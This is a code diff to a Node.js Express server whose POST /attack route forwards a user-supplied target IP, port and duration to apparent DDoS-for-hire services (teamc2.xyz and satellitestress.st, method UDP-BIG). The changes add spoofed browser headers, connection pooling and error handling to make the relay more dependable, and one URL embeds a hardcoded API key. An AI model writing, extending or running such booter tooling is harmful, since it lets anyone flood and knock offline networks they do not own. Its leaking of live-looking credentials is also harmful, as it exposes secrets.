@@ -11,6 +11,7 @@ process.on("unhandledRejection", err => {
 const express = require("express");
 const axios = require("axios");
 const cors = require("cors");
+const https = require("https");
 
 const app = express();
 
@@ -24,6 +25,37 @@ const MODE = process.env.MODE || "teamc2";
 
 console.log("MODE:", MODE);
 console.log("API_KEY:", API_KEY ? "Loaded ✅" : "Missing ❌");
+
+// ================= CONFIG =================
+
+// ✅ Keep-alive agent
+const agent = new https.Agent({
+  keepAlive: true,
+  maxSockets: 50
+});
+
+// ✅ Browser-like headers
+const defaultHeaders = {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+  "Accept": "application/json, text/plain, */*",
+  "Accept-Language": "en-US,en;q=0.9",
+  "Connection": "keep-alive"
+};
+
+// ✅ Common GET helper
+async function httpGet(url) {
+  const res = await axios.get(url, {
+    timeout: 15000,
+    httpsAgent: agent,
+    headers: defaultHeaders,
+    validateStatus: () => true // errors ko throw na kare
+  });
+
+  return {
+    status: res.status,
+    data: res.data
+  };
+}
 
 // ================= ROUTES =================
 
@@ -51,9 +83,11 @@ app.post("/attack", async (req, res) => {
       return res.status(400).json({ error: "Invalid port/time" });
     }
 
+    const safeIp = encodeURIComponent(ip);
+
     let responseData;
 
-    // ================= 🔥 TEAMC2 (HTTP/1.1) =================
+    // ================= 🔥 TEAMC2 =================
     if (MODE === "teamc2") {
       if (!API_KEY) {
         return res.status(500).json({ error: "API key missing" });
@@ -61,30 +95,40 @@ app.post("/attack", async (req, res) => {
 
       const url = `https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1`;
 
-      console.log("🌐 TEAMC2 (HTTP/1.1)");
+      console.log("🌐 TEAMC2");
 
-      const resHttp1 = await axios.get(url, {
-        timeout: 10000
-      });
+      const r = await httpGet(url);
 
-      console.log("📦 TEAMC2 RAW:", resHttp1.data);
+      console.log("📦 TEAMC2:", r.status, r.data);
 
-      responseData = resHttp1.data;
+      if (r.status >= 400) {
+        return res.status(r.status).json({
+          success: false,
+          error: r.data || `HTTP ${r.status}`
+        });
+      }
+
+      responseData = r.data;
     }
 
-    // ================= 🔥 CAT (HTTP/1.1) =================
+    // ================= 🔥 CAT =================
     else if (MODE === "cat") {
-      console.log("🌐 CAT (HTTP/1.1)");
+      console.log("🌐 CAT");
 
       const url = `https://satellitestress.st/api/v1/attack/start?key=sk_live_2003892d0f07f1bf1dae6fcef33678b73d0fdac68dcf0f3e71f1873de9b2a705&host=${ip}&port=${port}&time=${time}&method=UDP-BIG`;
 
-      const resHttp1 = await axios.get(url, {
-        timeout: 10000
-      });
+      const r = await httpGet(url);
 
-      console.log("📦 CAT RAW:", resHttp1.data);
+      console.log("📦 CAT:", r.status, r.data);
 
-      responseData = resHttp1.data;
+      if (r.status >= 400) {
+        return res.status(r.status).json({
+          success: false,
+          error: r.data || `HTTP ${r.status}`
+        });
+      }
+
+      responseData = r.data;
     }
 
     else {
@@ -99,9 +143,9 @@ app.post("/attack", async (req, res) => {
   } catch (err) {
     console.error("🔥 ERROR:", err.message || err);
 
-    return res.status(err?.response?.status || 500).json({
+    return res.status(500).json({
       success: false,
-      error: err?.response?.data || err.message
+      error: err.message || "Server error"
     });
   }
 });
